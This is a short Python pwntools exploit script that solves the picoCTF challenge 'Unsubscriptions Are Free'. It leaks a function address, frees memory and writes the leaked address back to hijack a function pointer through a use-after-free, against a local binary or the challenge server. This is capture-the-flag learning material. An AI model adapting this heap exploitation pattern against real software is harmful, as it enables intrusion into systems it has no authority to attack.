#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="Unsubscriptions Are Free", description="Exploits 'Unsubscriptions Are Free challenge from picoCTF")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()

	if args.local:
		proc = process(["./vuln"])
	elif args.remote:
		proc = process(["nc", "mercury.picoctf.net", "6312"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	# context.log_level = "debug"

	print("[+] Leaking vuln function address")
	proc.sendlineafter(b"(e)xit", b"S")
	proc.recvuntil(b"OOP! Memory leak...", drop=True)
	leak = int(proc.recvlineS(), 16)

	info("leaked address: %#x", leak)

	print("[+] Free memory")
	proc.sendlineafter(b"(e)xit", b"I")
	proc.sendlineafter(b"You're leaving already(Y/N)?", b'Y')

	print("[+] Updating value for user function with leaked address")
	proc.sendlineafter(b'(e)xit', b'L')
	proc.sendlineafter(b'try anyways:', flat(leak))

	warn(proc.recvlines(2)[1].decode())